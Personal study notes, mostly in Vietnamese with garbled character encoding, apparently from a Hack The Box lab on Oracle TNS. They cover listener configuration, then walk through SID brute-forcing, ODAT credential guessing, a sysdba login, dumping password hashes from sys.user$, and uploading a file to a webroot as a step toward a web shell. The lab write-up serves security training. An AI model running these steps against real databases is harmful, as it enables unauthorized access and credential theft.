Oracle TNS (Transparent Network Substrate) l√† giao th·ª©c trong b·ªô Oracle Net Services d√πng ƒë·ªÉ k·∫øt n·ªëi gi·ªØa ·ª©ng d·ª•ng client v√† c∆° s·ªü d·ªØ li·ªáu Oracle.
H·ªó tr·ª£ nhi·ªÅu giao th·ª©c m·∫°ng (v√≠ d·ª• TCP/IP, IPX/SPX) v√† ƒë√£ m·ªü r·ªông ƒë·ªÉ ho·∫°t ƒë·ªông v·ªõi IPv6.
L√† gi·∫£i ph√°p ph·ªï bi·∫øn cho h·ªá c∆° s·ªü d·ªØ li·ªáu l·ªõn/ph·ª©c t·∫°p trong c√°c ng√†nh nh∆∞ y t·∫ø, t√†i ch√≠nh, b√°n l·∫ª.
Cung c·∫•p c∆° ch·∫ø m√£ h√≥a truy·ªÅn t·∫£i (bao g·ªìm h·ªó tr·ª£ SSL/TLS) ƒë·ªÉ b·∫£o v·ªá d·ªØ li·ªáu khi truy·ªÅn qua m·∫°ng.
ƒê√≥ng g√≥p c√°c ch·ª©c nƒÉng ch√≠nh: ph√¢n gi·∫£i t√™n (name resolution), qu·∫£n l√Ω k·∫øt n·ªëi, c√¢n b·∫±ng t·∫£i (load balancing) v√† b·∫£o m·∫≠t.
M√£ h√≥a ho·∫°t ƒë·ªông nh∆∞ m·ªôt l·ªõp b·∫£o v·ªá b·ªï sung tr√™n TCP/IP, gi·∫£m r·ªßi ro truy c·∫≠p tr√°i ph√©p ho·∫∑c t·∫•n c√¥ng tr√™n l∆∞u l∆∞·ª£ng m·∫°ng.
H·ªó tr·ª£ c√¥ng c·ª• qu·∫£n tr·ªã: gi√°m s√°t hi·ªáu nƒÉng, ph√¢n t√≠ch, b√°o l·ªói v√† ghi log.
H·ªó tr·ª£ qu·∫£n l√Ω kh·ªëi l∆∞·ª£ng c√¥ng vi·ªác (workload management) v√† ch·ªãu l·ªói (fault tolerance) th√¥ng qua c√°c d·ªãch v·ª• c∆° s·ªü d·ªØ li·ªáu.
Ph√π h·ª£p cho m√¥i tr∆∞·ªùng doanh nghi·ªáp n∆°i y√™u c·∫ßu b·∫£o m·∫≠t v√† kh·∫£ nƒÉng v·∫≠n h√†nh cao.

Listener m·∫∑c ƒë·ªãnh l·∫Øng nghe tr√™n c·ªïng TCP 1521 (c√≥ th·ªÉ thay ƒë·ªïi l√∫c c√†i ho·∫∑c trong file c·∫•u h√¨nh).
H·ªó tr·ª£ nhi·ªÅu giao th·ª©c m·∫°ng: TCP/IP, UDP, IPX/SPX, AppleTalk.
C√≥ th·ªÉ l·∫Øng nghe tr√™n nhi·ªÅu giao di·ªán m·∫°ng ‚Äî tr√™n m·ªôt ƒë·ªãa ch·ªâ IP c·ª• th·ªÉ ho·∫∑c t·∫•t c·∫£ c√°c interface
C√°c c√†i ƒë·∫∑t ch√≠nh (c·ªïng, giao th·ª©c, interface) thay ƒë·ªïi ƒë∆∞·ª£c trong file c·∫•u h√¨nh (v√≠ d·ª• listener.ora).
Qu·∫£n l√Ω t·ª´ xa: ƒë∆∞·ª£c h·ªó tr·ª£ tr√™n Oracle 8i/9i, nh∆∞ng kh√¥ng ƒë∆∞·ª£c b·∫≠t/t∆∞∆°ng th√≠ch theo m·∫∑c ƒë·ªãnh tr√™n Oracle 10g/11g (theo ƒëo·∫°n vƒÉn b·∫°n ƒë∆∞a).
C√≥ th·ªÉ t√πy ch·ªânh ƒë·ªÉ ƒë√°p ·ª©ng y√™u c·∫ßu b·∫£o m·∫≠t v√† v·∫≠n h√†nh (thay ƒë·ªïi c·ªïng, h·∫°n ch·∫ø interface, b·∫≠t SSL/TLS, ‚Ä¶).

File c·∫•u h√¨nh ch√≠nh: tnsnames.ora, listener.ora, sqlnet.ora ‚Äî th∆∞·ªùng n·∫±m trong $ORACLE_HOME/network/admin.
M·∫∑c ƒë·ªãnh listener: l·∫Øng nghe tr√™n TCP/1521 (c√≥ th·ªÉ ƒë·ªïi).
Giao th·ª©c h·ªó tr·ª£: TCP/IP (m·ªü r·ªông t·ªõi IPv6), UDP, IPX/SPX, AppleTalk (t√πy b·∫£n/OS).
B·∫£o m·∫≠t m·∫∑c ƒë·ªãnh: ch·∫•p nh·∫≠n k·∫øt n·ªëi t·ª´ hosts ƒë∆∞·ª£c ch·∫•p thu·∫≠n (hostname/IP), h·ªó tr·ª£ m√£ h√≥a Oracle Net (c√≥ th·ªÉ c·∫•u h√¨nh SSL/TLS/TCPS).
M·∫≠t kh·∫©u m·∫∑c ƒë·ªãnh nguy hi·ªÉm: v√≠ d·ª• CHANGE_ON_INSTALL (Oracle 9) ho·∫∑c dbsnmp cho service DBSNMP ‚Äî ph·∫£i ƒë·ªïi khi th·∫•y.
Nguy c∆° kh√°c: d·ªãch v·ª• finger ho·∫∑c d·ªãch v·ª• kh√¥ng c·∫ßn thi·∫øt ch·∫°y tr√™n h·ªá c√≥ th·ªÉ l√†m l·ªô th√¥ng tin; t·∫Øt c√°c d·ªãch v·ª• th·ª´a.
M·ªói service/database c√≥ m·ªôt entry trong tnsnames.ora v·ªõi t√™n, host, port, SERVICE_NAME/SID.


Oracle TNS th∆∞·ªùng ƒë∆∞·ª£c s·ª≠ d·ª•ng v·ªõi c√°c d·ªãch v·ª• Oracle kh√°c nh∆∞ Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, m√°y ch·ªß web v√† nhi·ªÅu d·ªãch v·ª• kh√°c. ƒê√£ c√≥ nhi·ªÅu thay ƒë·ªïi ƒë·ªëi v·ªõi c√†i ƒë·∫∑t m·∫∑c ƒë·ªãnh c·ªßa c√°c d·ªãch v·ª• Oracle. V√≠ d·ª•: Oracle 9 c√≥ m·∫≠t kh·∫©u m·∫∑c ƒë·ªãnh l√† CHANGE_ON_INSTALL, trong khi Oracle 10 kh√¥ng c√≥ m·∫≠t kh·∫©u m·∫∑c ƒë·ªãnh n√†o ƒë∆∞·ª£c thi·∫øt l·∫≠p. D·ªãch v·ª• Oracle DBSNMP c≈©ng s·ª≠ d·ª•ng m·∫≠t kh·∫©u m·∫∑c ƒë·ªãnh l√† dbsnmp m√† ch√∫ng ta n√™n nh·ªõ khi g·∫∑p ph·∫£i m·∫≠t kh·∫©u n√†y. M·ªôt v√≠ d·ª• kh√°c l√† nhi·ªÅu t·ªï ch·ª©c v·∫´n s·ª≠ d·ª•ng d·ªãch v·ª• finger c√πng v·ªõi Oracle, ƒëi·ªÅu n√†y c√≥ th·ªÉ khi·∫øn d·ªãch v·ª• c·ªßa Oracle g·∫∑p r·ªßi ro v√† d·ªÖ b·ªã t·∫•n c√¥ng khi ch√∫ng ta c√≥ th√¥ng tin c·∫ßn thi·∫øt v·ªÅ th∆∞ m·ª•c g·ªëc.

M·ªói c∆° s·ªü d·ªØ li·ªáu ho·∫∑c d·ªãch v·ª• ƒë·ªÅu c√≥ m·ªôt m·ª•c duy nh·∫•t trong t·ªáp tnsnames.ora, ch·ª©a th√¥ng tin c·∫ßn thi·∫øt ƒë·ªÉ m√°y kh√°ch k·∫øt n·ªëi v·ªõi d·ªãch v·ª•. M·ª•c n√†y bao g·ªìm t√™n d·ªãch v·ª•, v·ªã tr√≠ m·∫°ng c·ªßa d·ªãch v·ª• v√† t√™n c∆° s·ªü d·ªØ li·ªáu ho·∫∑c d·ªãch v·ª• m√† m√°y kh√°ch n√™n s·ª≠ d·ª•ng khi k·∫øt n·ªëi v·ªõi d·ªãch v·ª•. V√≠ d·ª•: m·ªôt t·ªáp tnsnames.ora ƒë∆°n gi·∫£n c√≥ th·ªÉ tr√¥ng nh∆∞ th·∫ø n√†y:

================== FILE START ==================
Tnsnames.ora

ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )

================== FILE END ==================

·ªû ƒë√¢y, ch√∫ng ta c√≥ th·ªÉ th·∫•y m·ªôt d·ªãch v·ª• c√≥ t√™n l√† ORCL, ƒëang l·∫Øng nghe tr√™n c·ªïng TCP/1521 t·∫°i ƒë·ªãa ch·ªâ IP 10.129.11.102. M√°y kh√°ch n√™n s·ª≠ d·ª•ng t√™n d·ªãch v·ª• l√† orcl khi k·∫øt n·ªëi v·ªõi d·ªãch v·ª•. Tuy nhi√™n, t·ªáp tnsnames.ora c√≥ th·ªÉ ch·ª©a nhi·ªÅu m·ª•c nh·∫≠p nh∆∞ v·∫≠y cho c√°c c∆° s·ªü d·ªØ li·ªáu v√† d·ªãch v·ª• kh√°c nhau. C√°c m·ª•c nh·∫≠p n√†y c≈©ng c√≥ th·ªÉ bao g·ªìm th√¥ng tin b·ªï sung, ch·∫≥ng h·∫°n nh∆∞ chi ti·∫øt x√°c th·ª±c, c√†i ƒë·∫∑t nh√≥m k·∫øt n·ªëi v√† c·∫•u h√¨nh c√¢n b·∫±ng t·∫£i.
M·∫∑t kh√°c, t·ªáp listener.ora l√† t·ªáp c·∫•u h√¨nh ph√≠a m√°y ch·ªß, ƒë·ªãnh nghƒ©a c√°c thu·ªôc t√≠nh v√† tham s·ªë c·ªßa ti·∫øn tr√¨nh listener, ch·ªãu tr√°ch nhi·ªám ti·∫øp nh·∫≠n c√°c y√™u c·∫ßu t·ª´ m√°y kh√°ch v√† chuy·ªÉn ti·∫øp ch√∫ng ƒë·∫øn phi√™n b·∫£n c∆° s·ªü d·ªØ li·ªáu Oracle ph√π h·ª£p.

================== FILE START ==================
Listener.ora

SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle

================== FILE END ==================

T√≥m l·∫°i, ph·∫ßn m·ªÅm Oracle Net Services ph√≠a m√°y kh√°ch s·ª≠ d·ª•ng t·ªáp tnsnames.ora ƒë·ªÉ ph√¢n gi·∫£i t√™n d·ªãch v·ª• th√†nh ƒë·ªãa ch·ªâ m·∫°ng, trong khi ti·∫øn tr√¨nh l·∫Øng nghe s·ª≠ d·ª•ng t·ªáp listener.ora ƒë·ªÉ x√°c ƒë·ªãnh c√°c d·ªãch v·ª• c·∫ßn l·∫Øng nghe v√† h√†nh vi c·ªßa tr√¨nh l·∫Øng nghe.

C∆° s·ªü d·ªØ li·ªáu Oracle c√≥ th·ªÉ ƒë∆∞·ª£c b·∫£o v·ªá b·∫±ng c√°ch s·ª≠ d·ª•ng c√°i g·ªçi l√† Danh s√°ch Lo·∫°i tr·ª´ PL/SQL (PlsqlExclusionList). ƒê√¢y l√† m·ªôt t·ªáp vƒÉn b·∫£n do ng∆∞·ªùi d√πng t·∫°o, c·∫ßn ƒë∆∞·ª£c ƒë·∫∑t trong th∆∞ m·ª•c $ORACLE_HOME/sqldeveloper, v√† ch·ª©a t√™n c·ªßa c√°c g√≥i ho·∫∑c ki·ªÉu PL/SQL c·∫ßn ƒë∆∞·ª£c lo·∫°i tr·ª´ kh·ªèi qu√° tr√¨nh th·ª±c thi. Sau khi t·ªáp Danh s√°ch Lo·∫°i tr·ª´ PL/SQL ƒë∆∞·ª£c t·∫°o, n√≥ c√≥ th·ªÉ ƒë∆∞·ª£c t·∫£i v√†o phi√™n b·∫£n c∆° s·ªü d·ªØ li·ªáu. N√≥ ho·∫°t ƒë·ªông nh∆∞ m·ªôt danh s√°ch ƒëen kh√¥ng th·ªÉ truy c·∫≠p th√¥ng qua Oracle Application Server.

  | Setting              | M√¥ t·∫£                                                                                                   |
  | -------------------- | ------------------------------------------------------------------------------------------------------- |
  | `DESCRIPTION`        | M√¥ t·∫£ (descriptor) cung c·∫•p t√™n cho c∆° s·ªü d·ªØ li·ªáu v√† lo·∫°i k·∫øt n·ªëi.                                      |
  | `ADDRESS`            | ƒê·ªãa ch·ªâ m·∫°ng c·ªßa c∆° s·ªü d·ªØ li·ªáu (bao g·ªìm hostname v√† s·ªë c·ªïng).                                           |
  | `PROTOCOL`           | Giao th·ª©c m·∫°ng d√πng ƒë·ªÉ giao ti·∫øp v·ªõi server.                                                            |
  | `PORT`               | S·ªë c·ªïng d√πng ƒë·ªÉ giao ti·∫øp v·ªõi server.                                                                   |
  | `CONNECT_DATA`       | Ch·ªâ ƒë·ªãnh c√°c thu·ªôc t√≠nh c·ªßa k·∫øt n·ªëi, v√≠ d·ª• service name ho·∫∑c SID, protocol, v√† identifier c·ªßa instance. |
  | `INSTANCE_NAME`      | T√™n c·ªßa instance c∆° s·ªü d·ªØ li·ªáu m√† client mu·ªën k·∫øt n·ªëi.                                                  |
  | `SERVICE_NAME`       | T√™n d·ªãch v·ª• m√† client mu·ªën k·∫øt n·ªëi.                                                                     |
  | `SERVER`             | Lo·∫°i server cho k·∫øt n·ªëi (v√≠ d·ª•: dedicated ho·∫∑c shared).                                                 |
  | `USER`               | T√™n user d√πng ƒë·ªÉ x√°c th·ª±c v·ªõi server c∆° s·ªü d·ªØ li·ªáu.                                                     |
  | `PASSWORD`           | M·∫≠t kh·∫©u d√πng ƒë·ªÉ x√°c th·ª±c v·ªõi server c∆° s·ªü d·ªØ li·ªáu.                                                     |
  | `SECURITY`           | Lo·∫°i/thi·∫øt l·∫≠p b·∫£o m·∫≠t cho k·∫øt n·ªëi.                                                                     |
  | `VALIDATE_CERT`      | C√≥/kh√¥ng x√°c th·ª±c ch·ª©ng ch·ªâ khi s·ª≠ d·ª•ng SSL/TLS.                                                        |
  | `SSL_VERSION`        | Phi√™n b·∫£n SSL/TLS ƒë∆∞·ª£c s·ª≠ d·ª•ng cho k·∫øt n·ªëi.                                                             |
  | `CONNECT_TIMEOUT`    | Th·ªùi gian (gi√¢y) t·ªëi ƒëa ƒë·ªÉ client thi·∫øt l·∫≠p k·∫øt n·ªëi t·ªõi database.                                       |
  | `RECEIVE_TIMEOUT`    | Th·ªùi gian (gi√¢y) t·ªëi ƒëa ƒë·ªÉ client ch·ªù nh·∫≠n ph·∫£n h·ªìi t·ª´ database.                                        |
  | `SEND_TIMEOUT`       | Th·ªùi gian (gi√¢y) t·ªëi ƒëa ƒë·ªÉ client g·ª≠i y√™u c·∫ßu t·ªõi database.                                             |
  | `SQLNET.EXPIRE_TIME` | Th·ªùi gian (ph√∫t) ƒë·ªÉ server ph√°t hi·ªán k·∫øt n·ªëi ƒë√£ th·∫•t b·∫°i (keepalive ki·ªÉu Oracle).                       |
  | `TRACE_LEVEL`        | M·ª©c ƒë·ªô trace (ghi v·∫øt) cho k·∫øt n·ªëi database.                                                            |
  | `TRACE_DIRECTORY`    | Th∆∞ m·ª•c l∆∞u c√°c file trace.                                                                             |
  | `TRACE_FILE_NAME`    | T√™n file trace.                                                                                         |
  | `LOG_FILE`           | File d√πng ƒë·ªÉ l∆∞u th√¥ng tin log.                                                                         |

Tr∆∞·ªõc khi c√≥ th·ªÉ li·ªát k√™ tr√¨nh l·∫Øng nghe TNS v√† t∆∞∆°ng t√°c v·ªõi n√≥, ch√∫ng ta c·∫ßn t·∫£i xu·ªëng m·ªôt s·ªë g√≥i v√† c√¥ng c·ª• cho phi√™n b·∫£n Pwnbox c·ªßa m√¨nh, ph√≤ng tr∆∞·ªùng h·ª£p phi√™n b·∫£n n√†y ch∆∞a c√≥ s·∫µn. D∆∞·ªõi ƒë√¢y l√† m·ªôt t·∫≠p l·ªánh Bash th·ª±c hi·ªán t·∫•t c·∫£ nh·ªØng vi·ªác ƒë√≥:

Setting up

  naruto3co@htb[/htb]$ wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
  wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
  sudo mkdir -p /opt/oracle
  sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
  sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
  export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
  export PATH=$LD_LIBRARY_PATH:$PATH
  source ~/.bashrc
  cd ~
  git clone https://github.com/quentinhardy/odat.git
  cd odat/
  pip install python-libnmap
  git submodule init
  git submodule update
  pip3 install cx_Oracle
  sudo apt-get install python3-scapy -y
  sudo pip3 install colorlog termcolor passlib python-libnmap
  sudo apt-get install build-essential libgmp-dev -y
  pip3 install pycryptodome
  
  --2025-06-24 00:24:53--  https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
  Resolving download.oracle.com (download.oracle.com)... 23.58.104.121
  Connecting to download.oracle.com (download.oracle.com)|23.58.104.121|:443... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 79386308 (76M) [application/zip]
  Saving to: ‚Äòinstantclient-basic-linux.x64-21.4.0.0.0dbru.zip‚Äô
  
  <SNIP>
  
After that, we can try to determine if the installation was successful by running the following command:
  naruto3co@htb[/htb]$ ./odat.py -h

Oracle Database Attacking Tool (ODAT) l√† m·ªôt c√¥ng c·ª• ki·ªÉm tra x√¢m nh·∫≠p m√£ ngu·ªìn m·ªü ƒë∆∞·ª£c vi·∫øt b·∫±ng Python v√† ƒë∆∞·ª£c thi·∫øt k·∫ø ƒë·ªÉ li·ªát k√™ v√† khai th√°c c√°c l·ªó h·ªïng trong c∆° s·ªü d·ªØ li·ªáu Oracle. C√¥ng c·ª• n√†y c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ x√°c ƒë·ªãnh v√† khai th√°c nhi·ªÅu l·ªó h·ªïng b·∫£o m·∫≠t kh√°c nhau trong c∆° s·ªü d·ªØ li·ªáu Oracle, bao g·ªìm t·∫•n c√¥ng ti√™m nhi·ªÖm SQL, th·ª±c thi m√£ t·ª´ xa v√† leo thang ƒë·∫∑c quy·ªÅn.
B√¢y gi·ªù, h√£y s·ª≠ d·ª•ng nmap ƒë·ªÉ qu√©t c·ªïng tr√¨nh nghe Oracle TNS m·∫∑c ƒë·ªãnh.

Nmap
  naruto3co@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open
    
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
    Nmap scan report for 10.129.204.235
    Host is up (0.0041s latency).
    PORT     STATE SERVICE    VERSION
    1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds

k·∫øt qu·∫£ nmap
  C·ªïng (port) ƒëang m·ªü v√† d·ªãch v·ª• (service) ƒëang ch·∫°y.
  SID (System Identifier) l√† t√™n duy nh·∫•t nh·∫≠n di·ªán m·ªôt instance c·ªßa c∆° s·ªü d·ªØ li·ªáu Oracle.
  M·ªôt h·ªá th·ªëng c√≥ th·ªÉ c√≥ nhi·ªÅu instance, m·ªói instance c√≥ System ID ri√™ng.
  Instance = t·∫≠p h·ª£p c√°c ti·∫øn tr√¨nh v√† v√πng nh·ªõ (processes & memory structures) ph·ªëi h·ª£p ƒë·ªÉ qu·∫£n l√Ω d·ªØ li·ªáu c·ªßa database.
  Khi client k·∫øt n·ªëi t·ªõi Oracle, n√≥ ch·ªâ ƒë·ªãnh SID trong chu·ªói k·∫øt n·ªëi (connection string).
  Client d√πng SID ƒë·ªÉ x√°c ƒë·ªãnh instance c·ª• th·ªÉ mu·ªën k·∫øt n·ªëi.
  N·∫øu client kh√¥ng ch·ªâ ƒë·ªãnh SID, s·∫Ω d√πng gi√° tr·ªã m·∫∑c ƒë·ªãnh ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a trong file tnsnames.ora.

Nmap - SID Bruteforcing
  naruto3co@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

We can use the odat.py tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the all option and try all modules of the odat.py tool.

ODAT
  naruto3co@htb[/htb]$ ./odat.py all -s 10.129.204.235
    [+] Checking if target 10.129.204.235:1521 is well configured for a connection...
    [+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...
    ...SNIP...
    
    [!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
    [!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
    [!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
    [+] Valid credentials found: scott/tiger. Continue...
    ...SNIP...

Trong v√≠ d·ª• n√†y, ch√∫ng t√¥i ƒë√£ t√¨m th·∫•y th√¥ng tin ƒëƒÉng nh·∫≠p h·ª£p l·ªá cho ng∆∞·ªùi d√πng Scott v√† m·∫≠t kh·∫©u Tiger. Sau ƒë√≥, ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng c√¥ng c·ª• sqlplus ƒë·ªÉ k·∫øt n·ªëi v√† t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu Oracle.

SQLplus - Log In
  naruto3co@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE
    C√¢n nh·∫Øc. XE l√† gi√° tr·ªã oracle-sid-brute c√≥ th·ªÉ show ra ·ªü ./odat.py 
    
N·∫øu b·∫°n g·∫∑p l·ªói sau sqlplus: l·ªói khi t·∫£i th∆∞ vi·ªán chia s·∫ª: libsqlplus.so: kh√¥ng th·ªÉ m·ªü t·ªáp ƒë·ªëi t∆∞·ª£ng chia s·∫ª: Kh√¥ng c√≥ t·ªáp ho·∫∑c th∆∞ m·ª•c n√†o nh∆∞ v·∫≠y, vui l√≤ng th·ª±c hi·ªán l·ªánh b√™n d∆∞·ªõi, tr√≠ch t·ª´ ƒë√¢y.
  https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared

  naruto3co@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig

There are many SQLplus commands that we can use to enumerate the database manually. For example, we can list all available tables in the current database or show us the privileges of the current user like the following:
https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985

Oracle RDBMS - Interaction
  SQL> select table_name from all_tables;
  SQL> select * from user_role_privs;

Here, the user scott has no administrative privileges. However, we can try using this account to log in as the System Database Admin (sysdba), giving us higher privileges. This is possible when the user scott has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.

Oracle RDBMS - Database Enumeration
  naruto3co@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
        ///////////// Ch·ªó n√†y l∆∞u √Ω r·∫•t quan trong so v·ªõi c√¢u l·ªánh login ·ªü ngay tr√™n l√† c√≥ tham s·ªë n√†y : as sysdba 
  SQL> select * from user_role_privs;
  
We can follow many approaches once we get access to an Oracle database. It highly depends on the information we have and the entire setup. However, we can not add new users or make any modifications. From this point, we could retrieve the password hashes from the sys.user$ and try to crack them offline. The query for this would look like the following:

Oracle RDBMS - Extract Password Hashes
  SQL> select name, password from sys.user$;

Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:

  Linux ‚Äî ƒë∆∞·ªùng d·∫´n: /var/www/html
  Windows ‚Äî ƒë∆∞·ªùng d·∫´n: C:\inetpub\wwwroot

First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.

Oracle RDBMS - File Upload
  naruto3co@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
  naruto3co@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

Cu·ªëi c√πng, ch√∫ng ta c√≥ th·ªÉ ki·ªÉm tra xem ph∆∞∆°ng ph√°p t·∫£i t·ªáp l√™n c√≥ ho·∫°t ƒë·ªông v·ªõi curl hay kh√¥ng. Do ƒë√≥, ch√∫ng ta s·∫Ω s·ª≠ d·ª•ng y√™u c·∫ßu GET http://<IP> ho·∫∑c c√≥ th·ªÉ truy c·∫≠p qua tr√¨nh duy·ªát.
  naruto3co@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt


| T√¨nh hu·ªëng           | L·ªánh nhanh                                           |                            |
| -------------------- | ---------------------------------------------------- | -------------------------- |
| M·ªü SQL*Plus          | `sqlplus scott/tiger@XE`                             |                            |
| Ch·∫°y script SQL      | `sqlplus scott/tiger@XE @script.sql`                 |                            |
| Ch·∫°y 1 c√¢u SQL nhanh | `echo "SELECT * FROM dual;"                          | sqlplus -S scott/tiger@XE` |
| Ch·∫°y v√† log ra file  | `sqlplus -S scott/tiger@XE @script.sql > result.log` |                            |



==================================== T√¥i th·∫•y c√°i n√†y ƒÉn h·∫°i ch·∫£ d√πng g√¨ - START ====================================

    
    üß≠ Nh√≥m 1 ‚Äì K·∫øt n·ªëi & ƒëi·ªÅu h∆∞·ªõng
    | L·ªánh                                        | M√¥ t·∫£                  | V√≠ d·ª•                                   |
    | ------------------------------------------- | ---------------------- | --------------------------------------- |
    | `CONNECT user/password@//host:port/service` | K·∫øt n·ªëi ƒë·∫øn CSDL       | `CONNECT scott/tiger@10.129.204.235/XE` |
    | `DISCONNECT`                                | Ng·∫Øt k·∫øt n·ªëi kh·ªèi CSDL | `DISCONNECT`                            |
    | `EXIT` / `QUIT`                             | Tho√°t kh·ªèi SQL*Plus    | `EXIT`                                  |
    
    üìä Nh√≥m 2 ‚Äì C√¢u l·ªánh SQL c∆° b·∫£n
    | L·ªánh                            | M√¥ t·∫£             | V√≠ d·ª•                                    |
    | ------------------------------- | ----------------- | ---------------------------------------- |
    | `SELECT ... FROM ...;`          | Truy v·∫•n d·ªØ li·ªáu  | `SELECT * FROM emp;`                     |
    | `DESC table_name`               | Xem c·∫•u tr√∫c b·∫£ng | `DESC emp`                               |
    | `INSERT INTO ... VALUES (...);` | Th√™m d·ªØ li·ªáu      | `INSERT INTO emp VALUES (...);`          |
    | `UPDATE ... SET ... WHERE ...;` | C·∫≠p nh·∫≠t d·ªØ li·ªáu  | `UPDATE emp SET sal=1000 WHERE empno=1;` |
    | `DELETE FROM ... WHERE ...;`    | X√≥a d·ªØ li·ªáu       | `DELETE FROM emp WHERE empno=1;`         |
    | `CREATE / ALTER / DROP TABLE`   | Qu·∫£n l√Ω b·∫£ng      | `CREATE TABLE test(id NUMBER);`          |
    
    SELECT username FROM all_users ORDER BY username;    // d√πng trong m·ªçi case 
    
    
    üîÑ Nh√≥m 3 ‚Äì Transaction
    | L·ªánh                | M√¥ t·∫£             | V√≠ d·ª•            |
    | ------------------- | ----------------- | ---------------- |
    | `COMMIT;`           | X√°c nh·∫≠n thay ƒë·ªïi | `COMMIT;`        |
    | `ROLLBACK;`         | H·ªßy thay ƒë·ªïi      | `ROLLBACK;`      |
    | `SAVEPOINT name;`   | T·∫°o ƒëi·ªÉm l∆∞u      | `SAVEPOINT A;`   |
    | `ROLLBACK TO name;` | Quay l·∫°i ƒëi·ªÉm l∆∞u | `ROLLBACK TO A;` |
    
    ‚öôÔ∏è Nh√≥m 4 ‚Äì PL/SQL & th·ªß t·ª•c
    | L·ªánh                   | M√¥ t·∫£                  | V√≠ d·ª•                  |
    | ---------------------- | ---------------------- | ---------------------- |
    | `BEGIN ... END; /`     | Ch·∫°y kh·ªëi PL/SQL       | `BEGIN NULL; END; /`   |
    | `EXEC procedure_name;` | G·ªçi th·ªß t·ª•c            | `EXEC update_salary;`  |
    | `SET SERVEROUTPUT ON;` | Hi·ªÉn th·ªã `DBMS_OUTPUT` | `SET SERVEROUTPUT ON;` |
    
    
    üìÅ Nh√≥m 5 ‚Äì Script & file
    | L·ªánh             | M√¥ t·∫£               | V√≠ d·ª•                   |
    | ---------------- | ------------------- | ----------------------- |
    | `@script.sql`    | Ch·∫°y file SQL       | `@/home/dat/test.sql`   |
    | `SPOOL filename` | Ghi k·∫øt qu·∫£ ra file | `SPOOL /tmp/output.txt` |
    | `SPOOL OFF`      | D·ª´ng ghi file       | `SPOOL OFF`             |
    
    
    üßÆ Nh√≥m 6 ‚Äì Bi·∫øn v√† tham s·ªë
    | L·ªánh                      | M√¥ t·∫£                    | V√≠ d·ª•                                   |
    | ------------------------- | ------------------------ | --------------------------------------- |
    | `DEFINE name = value`     | T·∫°o bi·∫øn thay th·∫ø        | `DEFINE dept=10`                        |
    | `&name`                   | G·ªçi bi·∫øn                 | `SELECT * FROM emp WHERE deptno=&dept;` |
    | `ACCEPT var PROMPT '...'` | Nh·∫≠p gi√° tr·ªã t·ª´ b√†n ph√≠m | `ACCEPT id PROMPT 'Enter ID:'`          |
    | `UNDEFINE name`           | X√≥a bi·∫øn                 | `UNDEFINE dept`                         |
    
    
    üñ•Ô∏è Nh√≥m 7 ‚Äì Hi·ªÉn th·ªã & ƒë·ªãnh d·∫°ng
